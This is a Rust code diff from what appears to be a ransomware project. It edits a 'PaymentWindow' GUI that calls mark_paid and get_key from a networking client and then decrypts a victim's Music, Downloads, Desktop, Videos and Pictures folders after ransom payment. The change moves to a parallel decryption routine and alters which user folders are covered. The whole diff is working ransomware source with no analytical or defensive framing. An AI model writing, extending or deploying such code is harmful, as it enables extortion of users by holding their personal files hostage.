@@ -7,9 +7,10 @@ use std::cell::RefCell;
 use sodiumoxide::crypto::box_::PublicKey;
 
 use crate::networking::client::{mark_paid, get_key};
-use crate::cryptography::encrypt::decrypt_folder;
+use crate::cryptography::decrypt_parallel::decrypt_folder_parallel;
 use std::path::PathBuf;
-use windows::Win32::UI::Shell::{SHGetKnownFolderPath, FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos, KNOWN_FOLDER_FLAG};
+use windows::Win32::UI::Shell::{SHGetKnownFolderPath, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Desktop, 
+    FOLDERID_Videos, FOLDERID_Pictures, KNOWN_FOLDER_FLAG};
 
 #[derive(Default, NwgUi)]
 pub struct PaymentWindow {
@@ -92,13 +93,13 @@ impl PaymentWindow {
                         // decrypt the files using decrypt_folder
                         println!("Starting file decryption process...");
                         
-                        let paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];
+                        let paths = [FOLDERID_Music, FOLDERID_Downloads, FOLDERID_Desktop, FOLDERID_Videos, FOLDERID_Pictures];
                         unsafe {
                             for path in paths {
                                 if let Ok(path_ptr) = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None) {
                                     let path_str = path_ptr.to_string().unwrap();
                                     let path_buf: PathBuf = path_str.into();
-                                    match decrypt_folder(&path_buf, &pk_clone, &secret_key) {
+                                    match decrypt_folder_parallel(&path_buf, &pk_clone, &secret_key) {
                                         Ok(_) => println!("Successfully decrypted: {:?}", path),
                                         Err(e) => println!("Error decrypting {:?}: {}", path, e),
                                     }
